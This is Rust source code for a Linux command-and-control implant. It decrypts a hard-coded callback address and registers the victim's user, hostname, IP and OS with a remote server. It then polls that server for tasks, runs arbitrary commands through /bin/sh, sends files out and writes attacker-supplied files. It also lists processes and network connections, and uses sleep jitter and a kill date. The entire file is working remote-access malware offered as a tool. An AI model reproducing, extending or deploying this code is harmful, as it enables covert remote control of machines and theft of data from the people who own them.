use base64::{engine::general_purpose::STANDARD, Engine as _};
use link_common::{
    build_client, decrypt_config, derive_key, CallbackRequest, RegisterRequest, TaskResponse,
};
use std::env;
use std::net::UdpSocket;
use std::process::Command;
use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

const CALLBACK: &str = env!("CALLBACK");

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

fn platform_info() -> String {
    std::fs::read_to_string("/etc/os-release")
        .ok()
        .and_then(|s| {
            s.lines().find(|l| l.starts_with("PRETTY_NAME=")).map(|l| {
                l.trim_start_matches("PRETTY_NAME=")
                    .trim_matches('"')
                    .to_string()
            })
        })
        .unwrap_or_else(|| "linux".into())
}

// ── Sleep configuration ───────────────────────────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);

fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}

fn get_jitter_percent() -> u32 {
    JITTER_PERCENT.load(Ordering::Relaxed)
}

fn set_sleep_seconds(seconds: u64) {
    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
}

fn set_jitter_percent(percent: u32) {
    JITTER_PERCENT.store(percent.min(100), Ordering::Relaxed);
}

// ── Kill date configuration ────────────────────────────────────────────────

/// `i64::MIN` is used as a sentinel meaning "no kill date set".
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN {
        None
    } else {
        Some(v)
    }
}

fn set_kill_date(timestamp: Option<i64>) {
    KILL_DATE.store(timestamp.unwrap_or(i64::MIN), Ordering::Relaxed);
}

fn should_exit() -> bool {
    if let Some(kill_date) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            if now.as_secs() as i64 > kill_date {
                return true;
            }
        }
    }
    false
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    // Decrypt the callback address
    let encryption_key = derive_key("linky-secret-key", "callback-salt");
    let decrypted_callback =
        decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        // Check if we should exit due to kill date
        if should_exit() {
            return;
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: platform_info(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(5);
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    let effective_cmd = if task.q.starts_with("upload ") {
                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
                            format!("upload {} {}", content, path)
                        } else {
                            task.q.clone()
                        }
                    } else {
                        task.q.clone()
                    };
                    prev_output = dispatch(&effective_cmd);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    let (cmd, args) = split_first(raw);
    match cmd {
        "cd" => env::set_current_dir(args)
            .map(|_| String::new())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "pwd" => env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "ls" => list_dir(if args.is_empty() { "." } else { args }),

        "pid" => std::process::id().to_string(),

        "whoami" => format!("{}@{}", username(), hostname()),

        "info" => collect_system_info(),
        "ps" => list_processes(),
        "netstat" => list_network_connections(),
        "sleep" => handle_sleep_command(args),
        "killdate" => handle_killdate_command(args),

        "download" => download_file(args),
        "upload" => upload_file(args),

        "shell" => shell_exec(args),

        // fallback: pass through /bin/sh
        _ => shell_exec(raw),
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("{}/", name)
                } else {
                    name
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

// ── Encrypted configuration ────────────────────────────────────────────────

// ── Helpers ──────────────────────────────────────────────────────────────────

fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
    use rand::Rng;

    if jitter_percent == 0 {
        // No jitter, just sleep the base time
        sleep(base_seconds);
    } else {
        // Calculate jitter range (±jitter_percent%)
        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
        let mut rng = rand::thread_rng();
        let jitter = rng.gen_range(-jitter_range..=jitter_range);

        // Ensure we don't sleep for negative time
        let sleep_time = if jitter.is_negative() {
            base_seconds.saturating_sub(jitter.unsigned_abs())
        } else {
            base_seconds.saturating_add(jitter as u64)
        };

        // Sleep for at least 1 second
        let final_sleep = sleep_time.max(1);
        sleep(final_sleep);
    }
}

fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!(
            "Current sleep: {} seconds, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }

    // Parse arguments
    let parts: Vec<&str> = args.split_whitespace().collect();

    if !parts.is_empty() {
        if let Ok(new_sleep) = parts[0].parse::<u64>() {
            set_sleep_seconds(new_sleep);

            if parts.len() > 1 {
                if let Ok(new_jitter) = parts[1].parse::<u32>() {
                    set_jitter_percent(new_jitter);
                    return format!(
                        "[+] Sleep updated: {} seconds, jitter: {}%",
                        get_sleep_seconds(),
                        get_jitter_percent()
                    );
                }
            }

            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
        }
    }

    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
}

fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        match get_kill_date() {
            Some(timestamp) => {
                // Convert timestamp to readable date
                if let Some(date_time) =
                    chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
                {
                    format!(
                        "Current kill date: {}",
                        date_time.format("%Y-%m-%d %H:%M:%S")
                    )
                } else {
                    format!("Current kill date: {} (invalid timestamp)", timestamp)
                }
            }
            None => "No kill date set".to_string(),
        }
    } else if args.to_lowercase() == "clear" {
        set_kill_date(None);
        "[+] Kill date cleared".to_string()
    } else {
        // Parse date in format YYYY-MM-DD or timestamp
        if let Ok(timestamp) = args.parse::<i64>() {
            set_kill_date(Some(timestamp));
            if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
            {
                format!(
                    "[+] Kill date set to: {}",
                    date_time.format("%Y-%m-%d %H:%M:%S")
                )
            } else {
                format!("[+] Kill date set to timestamp: {}", timestamp)
            }
        } else {
            // Try to parse as date string
            let formats = [
                "%Y-%m-%d",
                "%Y-%m-%d %H:%M:%S",
                "%Y/%m/%d",
                "%Y/%m/%d %H:%M:%S",
            ];
            for format in formats {
                if let Ok(parsed_date) = chrono::NaiveDateTime::parse_from_str(args, format) {
                    let timestamp = parsed_date.and_utc().timestamp();
                    set_kill_date(Some(timestamp));
                    return format!(
                        "[+] Kill date set to: {}",
                        parsed_date.format("%Y-%m-%d %H:%M:%S")
                    );
                }
            }
            "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
        }
    }
}

fn download_file(path: &str) -> String {
    if path.is_empty() {
        return "[-] Usage: download <file_path>".to_string();
    }
    match std::fs::read(path) {
        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
        Err(e) => format!("[-] Failed to read file: {}", e),
    }
}

fn upload_file(args: &str) -> String {
    if args.is_empty() {
        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
    }

    let (content, path) = match args.find(' ') {
        Some(i) => (&args[..i], args[i + 1..].trim_start()),
        None => return "[-] Invalid upload command format".to_string(),
    };

    let decoded = match STANDARD.decode(content) {
        Ok(data) => data,
        Err(e) => return format!("[-] Failed to decode base64: {}", e),
    };

    match std::fs::write(path, &decoded) {
        Ok(()) => format!("[+] File uploaded successfully: {}", path),
        Err(e) => format!("[-] Failed to write file: {}", e),
    }
}

fn collect_system_info() -> String {
    use std::fs;

    let mut info = Vec::new();

    // OS version (from /etc/os-release or /proc/version)
    if let Ok(os_release) = fs::read_to_string("/etc/os-release") {
        if let Some(name) = os_release.lines().find(|l| l.starts_with("PRETTY_NAME=")) {
            if let Some(value) = name.split('=').nth(1) {
                info.push(format!("OS Version: {}", value.trim_matches('"')));
            }
        }
    }

    // Architecture
    info.push(format!("Architecture: {}", std::env::consts::ARCH));

    // Current user and hostname
    info.push(format!("User: {}@{}", username(), hostname()));

    // Network interfaces and IPs
    let mut interfaces = Vec::new();
    if let Ok(entries) = fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let iface_name = entry.file_name().to_string_lossy().into_owned();
            if iface_name != "lo" {
                if let Some(addr) = get_interface_ip(&iface_name) {
                    interfaces.push(format!("{}: {}", iface_name, addr));
                }
            }
        }
    }
    if !interfaces.is_empty() {
        info.push(format!("Network: {}", interfaces.join(", ")));
    }

    // Memory info
    if let Ok(mem_info) = fs::read_to_string("/proc/meminfo") {
        if let Some(mem_total) = mem_info.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(value) = mem_total.split_whitespace().nth(1) {
                info.push(format!("RAM: {} KB", value));
            }
        }
    }

    // CPU info
    if let Ok(cpu_info) = fs::read_to_string("/proc/cpuinfo") {
        let cpu_count = cpu_info
            .lines()
            .filter(|l| l.starts_with("processor"))
            .count();
        if cpu_count > 0 {
            info.push(format!("CPU Cores: {}", cpu_count));
        }

        // Get CPU model
        if let Some(model_line) = cpu_info.lines().find(|l| l.starts_with("model name")) {
            if let Some(model) = model_line.split(':').nth(1) {
                info.push(format!("CPU Model: {}", model.trim()));
            }
        }
    }

    // Uptime
    if let Ok(uptime) = fs::read_to_string("/proc/uptime") {
        if let Some(seconds) = uptime.split_whitespace().next() {
            if let Ok(uptime_secs) = seconds.parse::<f64>() {
                let hours = (uptime_secs / 3600.0).floor();
                let minutes = ((uptime_secs % 3600.0) / 60.0).floor();
                info.push(format!("Uptime: {:.0}h {:.0}m", hours, minutes));
            }
        }
    }

    // Current process info
    info.push(format!("Process ID: {}", std::process::id()));

    // Current working directory
    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    // Environment variables count
    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}

fn get_interface_ip(interface: &str) -> Option<String> {
    use std::fs;

    // Verify interface is up
    let operstate = fs::read_to_string(format!("/sys/class/net/{}/operstate", interface)).ok()?;
    if operstate.trim() != "up" {
        return None;
    }

    // Parse /proc/net/fib_trie for LOCAL addresses
    let fib = fs::read_to_string("/proc/net/fib_trie").ok()?;
    let mut prev_ip: Option<std::net::Ipv4Addr> = None;
    for line in fib.lines() {
        let trimmed = line.trim();
        if trimmed.contains("LOCAL") && trimmed.starts_with("32") {
            if let Some(ip) = prev_ip {
                if !ip.is_loopback() && !ip.is_unspecified() {
                    return Some(ip.to_string());
                }
            }
        } else if let Ok(val) = trimmed
            .split_whitespace()
            .next()
            .unwrap_or("")
            .parse::<u32>()
        {
            prev_ip = Some(std::net::Ipv4Addr::from(val));
        } else {
            prev_ip = None;
        }
    }
    None
}

fn list_processes() -> String {
    use std::fs;
    use std::path::Path;

    let mut processes = Vec::new();

    // Header
    processes.push("PID\tPPID\tUSER\t\tCOMMAND".to_string());
    processes.push("-".repeat(50));

    // Read /proc directory for process information
    if let Ok(entries) = fs::read_dir("/proc") {
        for entry in entries.flatten() {
            if let Ok(pid_str) = entry.file_name().into_string() {
                if let Ok(_pid) = pid_str.parse::<u32>() {
                    // Only process numeric directories (PIDs)
                    let proc_path = Path::new("/proc").join(pid_str);

                    // Read process status
                    let status_path = proc_path.join("status");
                    if let Ok(status) = fs::read_to_string(status_path) {
                        let mut process_pid = 0;
                        let mut process_ppid = 0;
                        let mut process_uid = 0;
                        let mut process_name = "unknown".to_string();

                        for line in status.lines() {
                            if line.starts_with("Name:") {
                                if let Some(name) = line.split(':').nth(1) {
                                    process_name = name.trim().to_string();
                                }
                            } else if line.starts_with("Pid:") {
                                if let Some(pid_val) = line.split(':').nth(1) {
                                    if let Ok(p) = pid_val.trim().parse::<u32>() {
                                        process_pid = p;
                                    }
                                }
                            } else if line.starts_with("PPid:") {
                                if let Some(ppid_val) = line.split(':').nth(1) {
                                    if let Ok(pp) = ppid_val.trim().parse::<u32>() {
                                        process_ppid = pp;
                                    }
                                }
                            } else if line.starts_with("Uid:") {
                                if let Some(uid_val) = line.split(':').nth(1) {
                                    if let Some(u) = uid_val
                                        .split_whitespace()
                                        .next()
                                        .and_then(|s| s.parse::<u32>().ok())
                                    {
                                        process_uid = u;
                                    }
                                }
                            }
                        }

                        // Get username from UID
                        let username = get_username_from_uid(process_uid);

                        // Format process info
                        processes.push(format!(
                            "{}\t{}\t{}\t{}",
                            process_pid, process_ppid, username, process_name
                        ));
                    }
                }
            }
        }
    }

    if processes.len() <= 2 {
        "No processes found or insufficient permissions".to_string()
    } else {
        processes.join("\n")
    }
}

fn get_username_from_uid(uid: u32) -> String {
    use std::fs;

    // Try to read /etc/passwd
    if let Ok(passwd) = fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 {
                if let Ok(line_uid) = parts[2].parse::<u32>() {
                    if line_uid == uid {
                        return parts[0].to_string();
                    }
                }
            }
        }
    }

    uid.to_string()
}

fn list_network_connections() -> String {
    use std::fs;

    let mut connections = Vec::new();

    // Header
    connections.push("Proto\tLocal Address\t\tRemote Address\t\tState\tPID/Program".to_string());
    connections.push("-".repeat(80));

    // Read TCP connections from /proc/net/tcp
    if let Ok(tcp_content) = fs::read_to_string("/proc/net/tcp") {
        parse_net_connections(&tcp_content, "TCP", &mut connections);
    }

    // Read TCP6 connections from /proc/net/tcp6
    if let Ok(tcp6_content) = fs::read_to_string("/proc/net/tcp6") {
        parse_net_connections(&tcp6_content, "TCP6", &mut connections);
    }

    // Read UDP connections from /proc/net/udp
    if let Ok(udp_content) = fs::read_to_string("/proc/net/udp") {
        parse_net_connections(&udp_content, "UDP", &mut connections);
    }

    // Read UDP6 connections from /proc/net/udp6
    if let Ok(udp6_content) = fs::read_to_string("/proc/net/udp6") {
        parse_net_connections(&udp6_content, "UDP6", &mut connections);
    }

    if connections.len() <= 2 {
        "No network connections found or insufficient permissions".to_string()
    } else {
        connections.join("\n")
    }
}

fn parse_net_connections(content: &str, proto: &str, connections: &mut Vec<String>) {
    // Skip header line
    for line in content.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 10 {
            continue;
        }
        // Each address field is "IPHEX:PORTHEX"
        let (local_ip_hex, local_port_hex) = match parts[1].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let (remote_ip_hex, remote_port_hex) = match parts[2].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let state = parts[3];
        let inode = parts[9];

        // Convert hex to decimal
        let local_ip = hex_to_ip(local_ip_hex);
        let local_port = hex_to_port(local_port_hex);
        let remote_ip = hex_to_ip(remote_ip_hex);
        let remote_port = hex_to_port(remote_port_hex);

        // Get process info from inode
        let process_info = get_process_from_inode(inode);

        connections.push(format!(
            "{}\t{}:{}\t\t{}:{}\t\t{}\t{}",
            proto, local_ip, local_port, remote_ip, remote_port, state, process_info
        ));
    }
}

fn hex_to_ip(hex_str: &str) -> String {
    if hex_str.len() < 8 {
        return hex_str.to_string();
    }
    // /proc/net/tcp stores IPs in little-endian order — read bytes in reverse
    (0..4)
        .rev()
        .map(|i| {
            u8::from_str_radix(&hex_str[i * 2..i * 2 + 2], 16)
                .map(|b| b.to_string())
                .unwrap_or_else(|_| "?".to_string())
        })
        .collect::<Vec<_>>()
        .join(".")
}

fn hex_to_port(hex_str: &str) -> String {
    if let Ok(port) = u16::from_str_radix(hex_str, 16) {
        port.to_string()
    } else {
        hex_str.to_string()
    }
}

fn get_process_from_inode(inode: &str) -> String {
    use std::fs;

    // Search through /proc/*/fd/* to find matching inode
    if let Ok(proc_entries) = fs::read_dir("/proc") {
        for proc_entry in proc_entries.flatten() {
            if let Ok(pid_str) = proc_entry.file_name().into_string() {
                if let Ok(pid) = pid_str.parse::<u32>() {
                    let fd_path = format!("/proc/{}/fd", pid);
                    if let Ok(fd_entries) = fs::read_dir(&fd_path) {
                        for fd_entry in fd_entries.flatten() {
                            if let Ok(link_target) = fs::read_link(fd_entry.path()) {
                                if let Some(target_str) = link_target.to_str() {
                                    if target_str.contains(&format!("socket:[{}]", inode)) {
                                        // Found matching inode, get process name
                                        let status_path = format!("/proc/{}/status", pid_str);
                                        if let Ok(status) = fs::read_to_string(&status_path) {
                                            for line in status.lines() {
                                                if line.starts_with("Name:") {
                                                    if let Some(name) = line.split(':').nth(1) {
                                                        return format!(
                                                            "{}[{}]",
                                                            pid_str,
                                                            name.trim()
                                                        );
                                                    }
                                                }
                                            }
                                        }
                                        return format!("{}[unknown]", pid_str);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    "-".to_string()
}
